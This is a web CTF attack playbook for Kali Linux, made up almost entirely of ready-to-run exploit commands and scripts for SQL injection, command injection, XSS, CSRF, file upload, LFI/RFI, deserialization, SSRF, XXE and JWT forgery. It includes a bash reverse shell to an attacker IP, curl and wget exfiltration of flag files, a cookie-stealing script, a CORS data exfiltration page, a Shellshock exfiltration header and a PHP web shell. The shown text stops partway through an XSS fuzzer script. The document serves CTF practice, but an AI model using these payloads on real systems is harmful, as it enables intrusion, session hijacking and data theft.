# 🎯 Web CTF Attack Playbook
## Complete Guide for Kali Linux

> **Philosophy**: In CTFs, always start with recon, escalate to active attacks, and remember: the flag is often hiding in an unexpected place.

---

## 📋 Table of Contents
1. [Initial Setup & Tools](#initial-setup)
2. [Information Disclosure / Recon](#1-information-disclosure)
3. [Authentication & Session Issues](#2-authentication-session)
4. [Injection Attacks](#3-injection-attacks)
5. [XSS Attacks](#4-xss-attacks)
6. [CSRF Attacks](#5-csrf-attacks)
7. [File Upload & Path Traversal](#6-file-upload)
8. [Deserialization](#7-deserialization)
9. [Business Logic](#8-business-logic)
10. [API & Modern Web](#9-api-modern-web)
11. [Crypto & Encoding](#10-crypto-encoding)
12. [Misc & Advanced](#11-misc-advanced)

---

## Initial Setup & Tools {#initial-setup}

### Essential Tools (Pre-installed in Kali)
```bash
# Update Kali first
sudo apt update && sudo apt upgrade -y

# Verify essential tools
which burpsuite curl ffuf gobuster nikto sqlmap john hydra
```

### Additional Tools to Install
```bash
# JWT manipulation
pip3 install pyjwt

# Web fuzzing
sudo apt install wfuzz -y

# Git dumper
pip3 install git-dumper

# NoSQL injection
pip3 install nosqlmap

# Advanced web scanner
pip3 install arjun sublist3r

# Cookie editor
# Install "Cookie-Editor" extension in Firefox
```

### Your CTF Workflow Directory
```bash
mkdir -p ~/ctf/{recon,exploits,loot,notes}
cd ~/ctf
export TARGET="http://target-ip:port"
```

---

## 1. Information Disclosure / Recon {#1-information-disclosure}

### Step 1.1: Initial Reconnaissance
```bash
# Basic URL check
curl -I $TARGET

# Check robots.txt
curl $TARGET/robots.txt

# Check sitemap
curl $TARGET/sitemap.xml

# Check common files
for file in robots.txt sitemap.xml .git/config .env .DS_Store; do
    curl -s $TARGET/$file -o recon/$file 2>/dev/null && echo "[+] Found: $file"
done
```

### Step 1.2: Directory & File Fuzzing
```bash
# Gobuster (fast)
gobuster dir -u $TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip,bak -o recon/gobuster.txt

# Ffuf (modern alternative)
ffuf -u $TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -o recon/ffuf.json

# Backup file fuzzing
ffuf -u $TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/backup-files.txt
```

### Step 1.3: Git Repository Extraction
```bash
# Check if .git exists
curl $TARGET/.git/config

# Dump entire repository
git-dumper $TARGET/.git ~/ctf/recon/git-dump

# Search for secrets in git
cd ~/ctf/recon/git-dump
git log --all --full-history
git grep -i "password\|secret\|key\|flag"
```

### Step 1.4: Source Code Analysis
```bash
# Download entire site
wget -r -np -k $TARGET -P recon/website/

# Search for interesting strings
grep -r "flag\|password\|api_key\|token" recon/website/

# Look for comments
grep -r "<!--" recon/website/ | grep -v "^Binary"

# JavaScript analysis
find recon/website/ -name "*.js" -exec grep -H "flag\|api\|secret" {} \;
```

### Step 1.5: Subdomain & DNS Enum
```bash
# Subdomain discovery
sublist3r -d target.com -o recon/subdomains.txt

# DNS records
dig target.com ANY
nslookup target.com
```

---

## 2. Authentication & Session Issues {#2-authentication-session}

### Step 2.1: Default Credentials
```bash
# Try common credentials
# admin:admin, admin:password, test:test, root:root, admin:admin123

# Hydra brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# Custom wordlist attack
hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt $TARGET http-post-form "/login:username=^USER^&password=^PASS^:F=failed"
```

### Step 2.2: Cookie Manipulation
```bash
# Capture cookie in Burp Suite
# Look for: isAdmin=false, role=user, auth=base64string

# Decode Base64 cookies
echo "dXNlcjoxMjM=" | base64 -d

# Modify and re-encode
echo "admin:123" | base64

# Test modified cookie
curl -b "session=YWRtaW46MTIz" $TARGET/admin
```

### Step 2.3: JWT Token Attacks

#### Check JWT structure
```bash
# Decode JWT (header.payload.signature)
echo "eyJhbGc..." | cut -d. -f1 | base64 -d
echo "eyJhbGc..." | cut -d. -f2 | base64 -d
```

#### Attack 1: alg=none
```python
# jwt_none.py
import jwt

payload = {"user": "admin", "role": "admin"}
token = jwt.encode(payload, "", algorithm="none")
print(token)
```

```bash
python3 jwt_none.py
# Use this token in Authorization: Bearer <token>
```

#### Attack 2: Weak Secret Brute Force
```bash
# JWT cracker
git clone https://github.com/brendan-rius/c-jwt-cracker
cd c-jwt-cracker
make
./jwtcrack <your-jwt-token>

# Or use hashcat
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

#### Attack 3: Key Confusion (RS256 → HS256)
```python
# jwt_confusion.py
import jwt

# Get public key from /jwks or /.well-known/jwks.json
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBg...
-----END PUBLIC KEY-----"""

payload = {"user": "admin", "role": "admin"}
# Sign with public key using HS256 (symmetric)
token = jwt.encode(payload, public_key, algorithm="HS256")
print(token)
```

### Step 2.4: Session Attacks
```bash
# Session fixation
# Set your own session ID before login
curl -b "PHPSESSID=malicious123" $TARGET/login -d "user=victim&pass=password"

# Session replay
# Capture valid session in Burp, replay later
```

### Step 2.5: Password Reset Poisoning
```bash
# Intercept password reset request
# Change email parameter: email=victim@target.com → email=attacker@evil.com
# Or add Host header: Host: evil.com

# Burp Suite request:
POST /reset-password HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

---

## 3. Injection Attacks {#3-injection-attacks}

### Step 3.1: SQL Injection

#### Manual Testing
```bash
# Test for SQLi
curl "$TARGET/product?id=1'"
curl "$TARGET/product?id=1 OR 1=1--"
curl "$TARGET/product?id=1 UNION SELECT NULL--"

# Find number of columns
curl "$TARGET/product?id=1 ORDER BY 5--"  # Increase until error
```

#### SQLMap (Automated)
```bash
# Basic scan
sqlmap -u "$TARGET/product?id=1" --batch --dbs

# Dump specific database
sqlmap -u "$TARGET/product?id=1" -D ctf_db --tables

# Dump table data
sqlmap -u "$TARGET/product?id=1" -D ctf_db -T users --dump

# POST request SQLi
sqlmap -u "$TARGET/login" --data "username=admin&password=test" -p username --batch

# Cookie-based SQLi
sqlmap -u "$TARGET/profile" --cookie "id=1" --level 2

# Tamper scripts (bypass WAF)
sqlmap -u "$TARGET/product?id=1" --tamper=space2comment --batch
```

#### Blind SQLi (Manual)
```bash
# Boolean-based
curl "$TARGET/user?id=1' AND 1=1--"  # Normal response
curl "$TARGET/user?id=1' AND 1=2--"  # Different response

# Time-based
curl "$TARGET/user?id=1' AND SLEEP(5)--"  # Delays 5 seconds

# Extract data char by char
curl "$TARGET/user?id=1' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--"
```

### Step 3.2: Command Injection

#### Basic Payloads
```bash
# Test with:
; ls
| ls
& ls
&& ls
`ls`
$(ls)
%0als  # Newline
```

#### Testing in Burp Suite
```
POST /ping HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1; cat /etc/passwd
```

#### Bypass Filters
```bash
# Space bypass
{ls,-la}
$IFS
${IFS}
$IFS$9

# Keyword bypass
c''at /etc/passwd
c\at /etc/passwd
/???/??t /???/??ss??  # Wildcards

# Exfiltration
curl http://your-server.com/`whoami`
wget http://your-server.com/?data=$(cat flag.txt | base64)
```

#### Reverse Shell
```bash
# Start listener on Kali
nc -lvnp 4444

# Inject payload (URL encode it)
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

# Encoded version:
echo YmFzaCAtaSA+JiAvZGV2L3RjcC9ZT1VSX0lQL... | base64 -d | bash
```

### Step 3.3: NoSQL Injection

#### MongoDB Injection
```bash
# Login bypass (JSON)
curl -X POST $TARGET/login -H "Content-Type: application/json" \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'

# Boolean logic
{"username": {"$gt": ""}, "password": {"$gt": ""}}

# Regex injection
{"username": {"$regex": "^admin"}, "password": {"$regex": "^.*"}}
```

#### Extract data
```python
# nosql_extract.py
import requests

url = "http://target/login"
password = ""
charset = "abcdefghijklmnopqrstuvwxyz0123456789"

for pos in range(1, 50):
    for char in charset:
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password}{char}"}
        }
        r = requests.post(url, json=payload)
        if "success" in r.text:
            password += char
            print(f"[+] Password: {password}")
            break
```

---

## 4. XSS Attacks {#4-xss-attacks}

### Step 4.1: Detection
```bash
# Basic test
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# In URL parameter
curl "$TARGET/search?q=<script>alert(1)</script>"
```

### Step 4.2: Filter Bypass Techniques

#### Payload List
```html
<!-- Event handlers -->
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>

<!-- SVG -->
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>

<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Polyglot -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e

<!-- Protocol handlers -->
<a href="javascript:alert(1)">Click</a>
```

### Step 4.3: Steal Cookies (Stored XSS)
```javascript
// Setup receiver on your Kali
python3 -m http.server 8000

// Inject this payload
<script>
fetch('http://YOUR_KALI_IP:8000/?cookie='+document.cookie)
</script>

// Or shorter
<script>location='http://YOUR_IP:8000/?c='+document.cookie</script>
```

### Step 4.4: DOM-based XSS
```javascript
// Find sinks in JavaScript
document.write()
element.innerHTML = 
eval()
setTimeout()
setInterval()

// Example payload
http://target/page#<img src=x onerror=alert(1)>
```

### Step 4.5: XSS in Modern Frameworks
```html
<!-- React/Vue bypass -->
{{constructor.constructor('alert(1)')()}}

<!-- Angular -->
{{$on.constructor('alert(1)')()}}

<!-- Markdown XSS -->
[Click me](javascript:alert(1))
![](javascript:alert(1))
```

---

## 5. CSRF Attacks {#5-csrf-attacks}

### Step 5.1: Detection
```bash
# Check if anti-CSRF token exists
# Inspect form: <input name="csrf_token" value="...">

# Test without token
curl -X POST $TARGET/change-email -d "email=attacker@evil.com" \
  -H "Cookie: session=victim_session"
```

### Step 5.2: CSRF Exploit HTML
```html
<!-- csrf_exploit.html -->
<!DOCTYPE html>
<html>
<body>
  <h1>You won a prize!</h1>
  <form id="csrf" action="http://target.com/change-password" method="POST">
    <input type="hidden" name="password" value="hacked123">
  </form>
  <script>
    document.getElementById('csrf').submit();
  </script>
</body>
</html>
```

### Step 5.3: Bypass Techniques
```bash
# Remove Referer header
curl -X POST $TARGET/action -d "param=value" -H "Referer:"

# JSON CSRF (if no Content-Type check)
<form action="http://target/api" method="POST" enctype="text/plain">
  <input name='{"action":"delete","id":"123"}' value='x'>
</form>

# SameSite=None bypass (requires user interaction on target domain)
```

---

## 6. File Upload & Path Traversal {#6-file-upload}

### Step 6.1: File Upload Bypass

#### PHP Web Shell
```php
<?php
// shell.php
system($_GET['cmd']);
?>
```

#### Upload Techniques
```bash
# 1. Direct upload
curl -F "file=@shell.php" $TARGET/upload

# 2. Double extension
mv shell.php shell.php.jpg
curl -F "file=@shell.php.jpg" $TARGET/upload

# 3. Null byte (older PHP)
curl -F "file=@shell.php%00.jpg" $TARGET/upload

# 4. MIME type bypass (change in Burp)
Content-Type: image/jpeg  # But file is actually .php

# 5. Case variation
shell.PhP, shell.pHP

# 6. Add valid image header
printf '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > shell.php.jpg
```

#### Bypass Extension Blacklist
```bash
# Try these extensions:
.phtml, .php3, .php4, .php5, .phar, .phps, .pht, .phpt
.php.jpg  # If only last extension checked
```

### Step 6.2: Path Traversal
```bash
# Basic payloads
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd  # URL encoded
....//....//....//etc/passwd  # Filter bypass

# Windows
..\..\..\windows\system32\drivers\etc\hosts

# Read common files
/etc/passwd
/etc/shadow
/var/www/html/config.php
/proc/self/environ
~/.bash_history
~/.ssh/id_rsa
```

#### Automated Tool
```bash
# DotDotPwn
dotdotpwn -m http -h target.com -x 80 -f /etc/passwd -k "root:"
```

### Step 6.3: Local File Inclusion (LFI)
```bash
# Test parameter
curl "$TARGET/page?file=../../../../etc/passwd"

# PHP wrappers
php://filter/convert.base64-encode/resource=index.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# Log poisoning (if you can write to logs)
# 1. Inject PHP in User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" $TARGET/

# 2. Include log file
curl "$TARGET/page?file=/var/log/apache2/access.log&cmd=whoami"
```

### Step 6.4: Remote File Inclusion (RFI)
```bash
# Host malicious PHP on your server
echo '<?php system($_GET["cmd"]); ?>' > shell.txt
python3 -m http.server 8000

# Include remote file
curl "$TARGET/page?file=http://YOUR_IP:8000/shell.txt&cmd=whoami"
```

---

## 7. Deserialization {#7-deserialization}

### Step 7.1: PHP Object Injection
```php
// Find unserialize() calls in source code
unserialize($_COOKIE['data'])

// Create malicious object
<?php
class Evil {
    public $cmd = "system('cat /flag.txt');";
    function __destruct() {
        eval($this->cmd);
    }
}
echo serialize(new Evil());
?>
```

```bash
# Generate payload
php exploit.php

# Send serialized object
curl -b "data=O:4:\"Evil\":1:{s:3:\"cmd\";s:24:\"system('cat /flag.txt');";}" $TARGET
```

### Step 7.2: Python Pickle RCE
```python
# pickle_exploit.py
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload)
```

```bash
# Send payload
curl -X POST $TARGET/api -d "data=$(python3 pickle_exploit.py)"
```

### Step 7.3: Java Deserialization
```bash
# Use ysoserial
java -jar ysoserial.jar CommonsCollections6 'curl http://YOUR_IP:8000/$(cat /flag.txt)' | base64

# Send in cookie/parameter
curl -b "session=<base64-payload>" $TARGET
```

---

## 8. Business Logic {#8-business-logic}

### Step 8.1: IDOR (Insecure Direct Object Reference)
```bash
# Test sequential IDs
curl $TARGET/profile?id=1
curl $TARGET/profile?id=2
curl $TARGET/profile?id=3

# Test with Burp Intruder
# Set payload position: /api/user/§1§
# Payload type: Numbers (1-1000)
```

### Step 8.2: Privilege Escalation
```bash
# Intercept request in Burp
POST /api/update-profile HTTP/1.1
...
{"name": "John", "email": "john@test.com"}

# Add role parameter
{"name": "John", "email": "john@test.com", "role": "admin"}

# Or modify existing
{"name": "John", "email": "john@test.com", "isAdmin": true}
```

### Step 8.3: Race Condition
```python
# race_condition.py
import requests
import threading

url = "http://target/buy-product"
session = "your_session_cookie"

def buy():
    requests.post(url, cookies={"session": session}, data={"id": 1})

# Send 10 simultaneous requests
threads = []
for i in range(10):
    t = threading.Thread(target=buy)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

### Step 8.4: Price Manipulation
```bash
# Intercept purchase request
POST /checkout HTTP/1.1
...
{"product_id": 1, "price": 100}

# Change price
{"product_id": 1, "price": 0.01}

# Or negative value
{"product_id": 1, "quantity": -1}
```

### Step 8.5: Force Browsing
```bash
# Try accessing admin pages directly
curl $TARGET/admin
curl $TARGET/admin/users
curl $TARGET/api/internal/config

# Enumerate with wordlist
ffuf -u $TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/admin-panels.txt
```

---

## 9. API & Modern Web {#9-api-modern-web}

### Step 9.1: GraphQL Exploitation

#### Introspection Query
```bash
# Enable introspection
curl -X POST $TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{__schema{types{name,fields{name}}}}"}'

# Use GraphQL Voyager (visual tool)
# Or automated tool:
git clone https://github.com/nikitastupin/clairvoyance
python3 clairvoyance.py -o schema.json $TARGET/graphql
```

#### Query Batching Attack
```json
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"}
]
```

#### Mutation Abuse
```graphql
mutation {
  updateUser(id: 1, role: "admin") {
    id
    role
  }
}
```

### Step 9.2: SSRF (Server-Side Request Forgery)

#### Basic SSRF
```bash
# Test internal network access
curl "$TARGET/fetch?url=http://127.0.0.1:8080"
curl "$TARGET/fetch?url=http://localhost:22"
curl "$TARGET/fetch?url=http://192.168.1.1"

# Cloud metadata (AWS)
curl "$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Cloud metadata (GCP)
curl "$TARGET/fetch?url=http://metadata.google.internal/computeMetadata/v1/"

# Cloud metadata (Azure)
curl "$TARGET/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

#### Bypass Filters
```bash
# URL encoding
http://127.0.0.1 → http://127.1
http://127.0.0.1 → http://0x7f000001
http://127.0.0.1 → http://2130706433  (decimal)

# DNS rebinding
# Use services like: http://1u.ms/

# Protocol smuggling
gopher://127.0.0.1:6379/_SET%20flag%20...
file:///etc/passwd
```

### Step 9.3: CORS Misconfiguration
```bash
# Check CORS policy
curl -H "Origin: http://evil.com" -I $TARGET/api/user

# Look for:
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

```html
<!-- Exploit CORS -->
<!DOCTYPE html>
<html>
<script>
  fetch('http://target.com/api/secret', {
    credentials: 'include'
  })
  .then(r => r.text())
  .then(data => {
    fetch('http://YOUR_IP:8000/?data=' + btoa(data));
  });
</script>
</html>
```

### Step 9.4: WebSocket Attacks
```javascript
// Connect via browser console
let ws = new WebSocket('ws://target.com/socket');

ws.onmessage = function(event) {
  console.log('Received:', event.data);
};

// Send malicious payload
ws.send('{"action":"admin","cmd":"cat /flag.txt"}');
```

### Step 9.5: API Rate Limit Bypass
```bash
# Add headers to bypass rate limit
curl $TARGET/api/login -d "user=admin&pass=test" \
  -H "X-Forwarded-For: 1.2.3.4" \
  -H "X-Originating-IP: 1.2.3.4" \
  -H "X-Remote-IP: 1.2.3.4" \
  -H "X-Client-IP: 1.2.3.4"

# Rotate IPs in script
for i in {1..255}; do
  curl -H "X-Forwarded-For: 1.1.1.$i" $TARGET/api/endpoint
done
```

---

## 10. Crypto & Encoding {#10-crypto-encoding}

### Step 10.1: Identify Encoding
```bash
# Base64
echo "ZmxhZ3tleGFtcGxlfQ==" | base64 -d

# Hex
echo "666c61677b6578616d706c657d" | xxd -r -p

# ROT13
echo "synt{rknzcyr}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# URL encoding
echo "flag%7Bexample%7D" | python3 -c "import sys, urllib.parse; print(urllib.parse.unquote(sys.stdin.read()))"
```

### Step 10.2: Hash Cracking
```bash
# Identify hash type
hash-identifier
hashid <hash>

# John the Ripper
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Hashcat (faster)
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt  # MD5
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt  # NTLM

# Online databases
# hashkiller.io, crackstation.net
```

### Step 10.3: Weak Encryption
```python
# XOR brute force
def xor_decrypt(ciphertext, key):
    return ''.join(chr(ord(c) ^ key) for c in ciphertext)

ciphertext = "encrypted_data"
for key in range(256):
    result = xor_decrypt(ciphertext, key)
    if 'flag' in result:
        print(f"Key: {key}, Result: {result}")
```

### Step 10.4: Padding Oracle
```bash
# Use padbuster tool
padbuster $TARGET/decrypt "encrypted_cookie" 8 -cookies "auth=encrypted_cookie"
```

---

## 11. Misc & Advanced {#11-misc-advanced}

### Step 11.1: CSP Bypass
```html
<!-- If nonce is in script tag -->
<script nonce="abc123">alert(1)</script>

<!-- JSONP callback abuse -->
<script src="http://trusted-site.com/api?callback=alert(1)"></script>

<!-- base-uri not set -->
<base href="http://evil.com/">
```

### Step 11.2: Regex DoS (ReDoS)
```bash
# Evil regex: (a+)+$
# Send input: aaaaaaaaaaaaaaaaaaaaaa!

curl "$TARGET/validate?input=aaaaaaaaaaaaaaaaaaaaaa!"
```

### Step 11.3: HTTP Request Smuggling
```
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
```

### Step 11.4: Cache Poisoning
```bash
# Poison X-Forwarded-Host header
curl $TARGET -H "X-Forwarded-Host: evil.com"

# If cached, all users get redirected to evil.com
```

### Step 11.5: WAF Bypass
```bash
# Case variation
<ScRiPt>alert(1)</sCrIpT>

# Double encoding
%253Cscript%253E

# Comment insertion
<scr<!--comment-->ipt>

# Null bytes
<script%00>alert(1)</script>

# Unicode
<script>alert(1)</script>  # Use Unicode lookalikes
```

---

## 🎯 CTF Challenge Workflow

When you encounter a web CTF challenge, follow this checklist:

### 1. Reconnaissance (5-10 min)
- [ ] Visit website, explore all pages
- [ ] View source code (Ctrl+U)
- [ ] Check robots.txt, sitemap.xml
- [ ] Run gobuster/ffuf for hidden directories
- [ ] Check for .git, .env, backup files
- [ ] Analyze JavaScript files
- [ ] Capture requests in Burp Suite

### 2. Authentication Testing (if login exists)
- [ ] Try default credentials
- [ ] Inspect cookies and JWT tokens
- [ ] Test SQL injection in login form
- [ ] Check for session vulnerabilities

### 3. Input Testing
- [ ] Test all parameters for SQLi
- [ ] Test for command injection
- [ ] Test for XSS in all inputs
- [ ] Test file upload (if exists)
- [ ] Test for path traversal

### 4. Logic Testing
- [ ] Test for IDOR in URLs
- [ ] Try accessing /admin, /api endpoints
- [ ] Test privilege escalation
- [ ] Look for race conditions

### 5. Modern Web Testing
- [ ] Test GraphQL introspection
- [ ] Check for SSRF vulnerabilities
- [ ] Test CORS policy
- [ ] Check API rate limits

### 6. Flag Hunting
- [ ] Search response headers for flags
- [ ] Check cookies for encoded data
- [ ] Look in JavaScript variables
- [ ] Check image metadata (exiftool)
- [ ] Search database dumps
- [ ] Check error messages

---

## 🛠️ Essential Burp Suite Techniques

### Setup Burp Proxy
```bash
# Start Burp Suite
burpsuite &

# Configure Firefox proxy
# Preferences → Network Settings
# Manual proxy: 127.0.0.1:8080
# Or use FoxyProxy extension
```

### Burp Intruder Attacks

#### Attack 1: Parameter Fuzzing
```
1. Capture request in Proxy
2. Send to Intruder (Ctrl+I)
3. Clear positions (Clear §)
4. Select parameter value → Add §
   Example: /user?id=§1§
5. Payloads → Numbers (1-1000)
6. Start attack
7. Look for different Length/Status
```

#### Attack 2: SQLi with Wordlist
```
1. Position: username=§payload§
2. Payloads → Load file
3. Select: /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
4. Grep - Match: "Welcome" or "error"
5. Start attack
```

#### Attack 3: JWT Token Brute Force
```
1. Capture JWT in Authorization header
2. Send to Intruder
3. Position on signature part
4. Payload: Runtime file
5. Use /usr/share/wordlists/rockyou.txt
```

### Burp Repeater Tips
```
1. Send request to Repeater (Ctrl+R)
2. Modify parameters quickly
3. Use Ctrl+Space for auto-complete
4. Right-click → Request in browser (to test in real browser)
5. Compare responses (right-click → Send to Comparer)
```

### Burp Extensions to Install
```
1. Open Extender tab
2. BApp Store
3. Install these:
   - Param Miner (find hidden parameters)
   - Autorize (test access control)
   - JSON Web Tokens (JWT editor)
   - Upload Scanner (file upload testing)
   - Turbo Intruder (fast fuzzing)
   - Logger++ (better logging)
```

---

## 🔥 Speed Hacking: Common CTF Patterns

### Pattern 1: Hidden Admin Panel
```bash
# Quick admin finder
ffuf -u $TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -mc 200,301,302,403

# Common paths:
/admin, /administrator, /admin.php, /panel, /dashboard
/admin/login, /admin/index.php, /phpMyAdmin
/manager, /controlpanel, /admin_area
```

### Pattern 2: Encoded Flag in Cookie
```bash
# Check cookies in browser DevTools (F12 → Application → Cookies)
# Or with curl
curl -i $TARGET/login -d "user=test&pass=test" | grep -i "Set-Cookie"

# Decode common encodings
echo "cookie_value" | base64 -d
echo "cookie_value" | xxd -r -p
echo "cookie_value" | python3 -c "import urllib.parse; print(urllib.parse.unquote(input()))"
```

### Pattern 3: SQL Injection → RCE
```bash
# Union-based file write
sqlmap -u "$TARGET/product?id=1" --file-write=shell.php --file-dest=/var/www/html/shell.php

# Or manual
curl "$TARGET/product?id=1' UNION SELECT '<?php system(\$_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/s.php'--"

# Access shell
curl "$TARGET/s.php?c=cat /flag.txt"
```

### Pattern 4: JWT with Weak Secret
```bash
# Fast check common secrets
for secret in secret admin password 123456 key; do
  echo "Testing: $secret"
  python3 -c "import jwt; print(jwt.encode({'user':'admin'}, '$secret', algorithm='HS256'))"
done | while read token; do
  curl -H "Authorization: Bearer $token" $TARGET/admin
done
```

### Pattern 5: Command Injection via User-Agent
```bash
# Test blind command injection
curl -A "() { :;}; /bin/bash -c 'ping -c 3 YOUR_IP'" $TARGET/

# Listen for ping
sudo tcpdump -i tun0 icmp

# Exfiltrate data
curl -A "() { :;}; /bin/bash -c 'cat /flag.txt | curl -d @- YOUR_IP:8000'" $TARGET/
```

### Pattern 6: LFI → RCE via Log Poisoning
```bash
# 1. Poison access log with PHP code
curl -A "<?php system(\$_GET['c']); ?>" $TARGET/

# 2. Include log file and execute
curl "$TARGET/page?file=/var/log/apache2/access.log&c=cat /flag.txt"

# Common log locations:
# /var/log/apache2/access.log
# /var/log/nginx/access.log
# /var/log/httpd/access_log
```

### Pattern 7: XXE (XML External Entity)
```bash
# Test endpoint
curl -X POST $TARGET/xml -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# Exfiltrate via out-of-band
# On your server: nc -lvnp 8000
curl -X POST $TARGET/xml -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://YOUR_IP:8000/?data=test">]><root>&xxe;</root>'
```

---

## 🚀 Automation Scripts

### Script 1: Quick Recon
```bash
#!/bin/bash
# quick_recon.sh

TARGET=$1
OUTPUT="recon_$(date +%s)"
mkdir -p $OUTPUT

echo "[+] Starting recon on $TARGET"

# Basic info
echo "[*] Checking basic files..."
for file in robots.txt sitemap.xml .git/config .env; do
    curl -s "$TARGET/$file" -o "$OUTPUT/$file" 2>/dev/null && echo "[+] Found: $file"
done

# Directory fuzzing
echo "[*] Directory fuzzing..."
gobuster dir -u $TARGET -w /usr/share/wordlists/dirb/common.txt -q -o $OUTPUT/dirs.txt

# Subdomain enum
echo "[*] Subdomain enumeration..."
sublist3r -d $(echo $TARGET | sed 's|http[s]*://||' | cut -d/ -f1) -o $OUTPUT/subdomains.txt 2>/dev/null

# Nikto scan
echo "[*] Running Nikto..."
nikto -h $TARGET -o $OUTPUT/nikto.txt -Format txt

echo "[+] Recon complete! Check $OUTPUT/"
```

### Script 2: SQL Injection Scanner
```python
#!/usr/bin/env python3
# sqli_scanner.py

import requests
import sys

def test_sqli(url):
    payloads = [
        "'", "1'--", "1' OR '1'='1", "1' OR '1'='1'--",
        "1' UNION SELECT NULL--", "' OR 1=1--",
        "admin' OR '1'='1", "' OR '1'='1' --"
    ]
    
    print(f"[*] Testing {url}")
    
    for payload in payloads:
        try:
            r = requests.get(f"{url}{payload}", timeout=5)
            if any(err in r.text.lower() for err in ['sql', 'mysql', 'sqlite', 'syntax', 'error']):
                print(f"[!] Potential SQLi: {payload}")
                print(f"    Response snippet: {r.text[:200]}")
        except Exception as e:
            print(f"[-] Error with payload {payload}: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: ./sqli_scanner.py http://target/page?id=")
        sys.exit(1)
    test_sqli(sys.argv[1])
```

### Script 3: JWT Decoder & Analyzer
```python
#!/usr/bin/env python3
# jwt_tool.py

import jwt
import json
import sys
import base64

def analyze_jwt(token):
    print("[*] JWT Analysis")
    print("="*50)
    
    # Decode without verification
    try:
        header = jwt.get_unverified_header(token)
        payload = jwt.decode(token, options={"verify_signature": False})
        
        print("\n[+] Header:")
        print(json.dumps(header, indent=2))
        
        print("\n[+] Payload:")
        print(json.dumps(payload, indent=2))
        
        print("\n[*] Attack Suggestions:")
        
        # Check algorithm
        if header.get('alg') == 'HS256':
            print("  - Try weak secret brute force")
            print("  - Try key confusion (HS256 -> RS256)")
        
        if header.get('alg') == 'none':
            print("  - Already using 'none' algorithm!")
        else:
            print("  - Try 'none' algorithm attack")
        
        # Check for sensitive data
        if 'role' in payload or 'admin' in str(payload).lower():
            print("  - Try privilege escalation by modifying role/admin field")
        
    except Exception as e:
        print(f"[-] Error decoding JWT: {e}")

def generate_none_token(payload_dict):
    # Create token with alg=none
    header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
    payload = base64.urlsafe_b64encode(json.dumps(payload_dict).encode()).decode().rstrip('=')
    return f"{header}.{payload}."

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: ./jwt_tool.py <JWT_TOKEN>")
        sys.exit(1)
    
    token = sys.argv[1]
    analyze_jwt(token)
    
    print("\n[*] Generate 'none' algorithm token? (y/n)")
    if input().lower() == 'y':
        payload = jwt.decode(token, options={"verify_signature": False})
        payload['role'] = 'admin'  # Modify as needed
        none_token = generate_none_token(payload)
        print(f"\n[+] Token with alg=none:")
        print(none_token)
```

### Script 4: XSS Payload Fuzzer
```bash
#!/bin/bash
# xss_fuzzer.sh

TARGET=$1
PARAM=$2

if [ -z "$TARGET" ] || [ -z "$PARAM" ]; then
    echo "Usage: ./xss_fuzzer.sh http://target/search param_name"
    exit 1
fi

echo "[*] XSS Fuzzing $TARGET"

# Payloads
PAYLOADS=(
    "<script>alert(1)</script>"
    "<img src=x onerror=alert(1)>"
